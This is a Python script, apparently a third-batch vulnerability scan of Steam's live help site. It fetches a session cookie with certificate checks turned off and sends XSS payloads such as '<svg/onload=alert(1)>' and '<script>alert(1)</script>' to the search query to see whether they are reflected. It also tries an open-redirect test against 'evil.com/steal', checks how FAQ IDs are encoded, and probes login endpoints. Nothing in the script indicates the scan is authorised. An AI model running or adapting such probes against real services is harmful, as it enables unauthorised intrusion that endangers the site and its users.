# -*- coding: utf-8 -*-
"""help2 第三批:实体化反射检查 + Login redirectUrl 消费 + faqs 编码"""
import re
import sys
import ssl
import http.cookiejar
import urllib.parse
import urllib.request

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
BASE = "https://help.steampowered.com"


def make_opener():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(
        urllib.request.HTTPSHandler(context=CTX),
        urllib.request.HTTPCookieProcessor(cj))
    op.addheaders = [('User-Agent', UA)]
    op.open(BASE + "/en/", timeout=15).read()
    sid = [c.value for c in cj if c.name == 'sessionid'][0]
    return op, sid


def req(op, url, method="GET", data=None, extra_headers=None):
    headers = {'User-Agent': UA}
    if extra_headers:
        headers.update(extra_headers)
    r = urllib.request.Request(url, headers=headers, method=method, data=data)
    try:
        resp = op.open(r, timeout=20)
        return resp.status, resp.read().decode('utf-8', 'replace'), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace'), dict(e.headers)


def main():
    op, sid = make_opener()
    ck = f'sessionid={sid}'

    print("=" * 70)
    print("[B2] SearchGame 实体化反射检查")
    print("=" * 70)
    # 保存正常结果页
    s, b, h = req(op, BASE + "/en/wizard/HelpWithGame/SearchGame/?query=csgo", extra_headers={'Cookie': ck})
    open(r'D:\scan\_valve_help\searchgame_csgo.html', 'w', encoding='utf-8').write(b)
    # 搜索结果链接
    for m in re.finditer(r'href="([^"]*HelpWithGame[^"]*)"[^>]*>\s*<[^>]*>\s*([^<]{2,40})', b):
        print("   link:", m.group(1)[:100], "|", m.group(2)[:40])
    for m in re.finditer(r'<div[^>]*class="[^"]*search[^"]*"[^>]*>', b):
        print("   div:", m.group(0)[:120])

    # 实体化检查:payload 中字符的实体形式
    checks = [
        ('<svg/onload=alert(1)>', ['&lt;svg/onload=alert(1)&gt;', '&lt;svg', '%3Csvg']),
        ('a\'><img src=x onerror=alert(1)>', ['&lt;img', '&quot;', '%3Cimg']),
        ('csgo"><script>alert(1)</script>', ['&lt;script&gt;', '%3Cscript%3E']),
    ]
    for raw, entity_forms in checks:
        s, b, h = req(op, BASE + "/en/wizard/HelpWithGame/SearchGame/?query=" + urllib.parse.quote(raw),
                      extra_headers={'Cookie': ck})
        print(f"--- query={raw!r} -> {s} len={len(b)} ---")
        for ef in entity_forms:
            n = b.count(ef)
            if n:
                i = b.find(ef)
                print(f"   {ef!r} x{n} @{i}: ...{b[max(0,i-80):i+80]}...")
        # 找 payload 关键子串的原始出现
        for sub in ['alert(1)', 'onerror', 'onload']:
            for m in re.finditer(re.escape(sub), b):
                i = m.start()
                print(f"   [{sub}] @{i}: ...{b[max(0,i-70):i+70]}...")
                break

    print()
    print("=" * 70)
    print("[A2] Login 页面 redirectUrl/redir 消费点")
    print("=" * 70)
    s, b, h = req(op, BASE + "/en/wizard/Login?redir=%2F%2Fevil.com%2Fsteal", extra_headers={'Cookie': ck})
    open(r'D:\scan\_valve_help\login_redir.html', 'w', encoding='utf-8').write(b)
    for kw in ['redirectUrl', 'redir', 'RedirectURL', 'login_redir', 'strRedirectURL']:
        for m in re.finditer(re.escape(kw), b):
            i = m.start()
            ctx = b[max(0, i - 60):i + 150].replace('\n', ' ')
            # 排除语言链接
            if 'hreflang' in ctx or 'popup_menu' in ctx:
                continue
            print(f"   [{kw}] @{i}: ...{ctx[:210]}...")
    # 找 data-props
    for m in re.finditer(r'data-props="[^"]{0,400}"', b):
        print("   data-props:", m.group(0)[:420])
    # 表单/登录 JS 调用
    for m in re.finditer(r'(login|Login|Logon|logon)[^<>]{0,120}', b):
        i = m.start()
        ctx = b[max(0, i - 40):i + 160].replace('\n', ' ')
        if 'href' not in ctx and 'link' not in ctx.lower():
            print("   js:", ctx[:200])

    print()
    print("=" * 70)
    print("[C] faqs ID 编码检查")
    print("=" * 70)
    for fid in ['A"B', 'A<B', 'A&B', "A'B", 'A B']:
        s, b, h = req(op, BASE + "/en/faqs/view/" + urllib.parse.quote(fid, safe=''),
                      extra_headers={'Cookie': ck})
        print(f"--- faqs id={fid!r} -> {s} len={len(b)} ---")
        for ent in [fid, fid.replace('<', '&lt;').replace('>', '&gt;'),
                    fid.replace('"', '&quot;').replace("'", '&#39;')]:
            n = b.count(ent)
            if n:
                i = b.find(ent)
                print(f"   {ent!r} x{n} @{i}: ...{b[max(0,i-70):i+100]}...")
        # 原文反射(URL 解码后出现在 href)
        for m in re.finditer(re.escape(fid.replace('"', '%22').replace('<', '%3C').replace('>', '%3E').replace('&', '%26')), b):
            i = m.start()
            print(f"   [urlenc] @{i}: ...{b[max(0,i-70):i+90]}...")

    print()
    print("=" * 70)
    print("[D] /en/login/ getrsakey 及其他登录辅助端点")
    print("=" * 70)
    for url in ['/en/login/getrsakey/', '/login/getrsakey/',
                '/en/wizard/AjaxSearchResults/?text=test',
                '/en/wizard/AjaxVerifySerialNumber/']:
        s, b, h = req(op, BASE + url, extra_headers={'Cookie': ck})
        print(f"{url} -> {s} len={len(b)} ct={h.get('Content-Type','')} body={b[:100]!r}")


if __name__ == '__main__':
    main()
